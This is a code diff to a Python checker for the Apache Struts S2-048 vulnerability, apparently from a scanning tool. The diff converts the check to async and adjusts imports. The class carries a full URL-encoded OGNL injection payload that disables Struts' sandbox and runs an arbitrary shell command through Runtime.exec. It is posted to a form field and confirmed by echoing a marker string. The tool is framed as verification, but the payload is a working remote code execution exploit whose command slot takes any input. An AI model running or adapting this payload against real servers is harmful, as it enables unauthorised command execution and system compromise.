@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_048_BaseVerify:
     def __init__(self, url):
@@ -24,7 +24,7 @@ class S2_048_BaseVerify:
         self.payload = '''%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())).(%23q)%7D'''
         self.data = 'name={data}&age=123&__checkbox_bustedBefore=true&description=123'
 
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -36,17 +36,14 @@ class S2_048_BaseVerify:
 
         try:
             payload = self.payload.format(cmd = 'echo ' + self.capta)
-            check_req = request.post(self.url, headers = self.headers, data = self.data.format(data = payload))
-            check_str = re.sub('\n', '', check_req.text)
+            check_req = await request.post(self.url, headers = self.headers, data = self.data.format(data = payload))
+            check_str = re.sub('\n', '', await check_req.text())
             result = re.findall('Gangster (.*?) added successfully', check_str)
             if self.capta in result:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
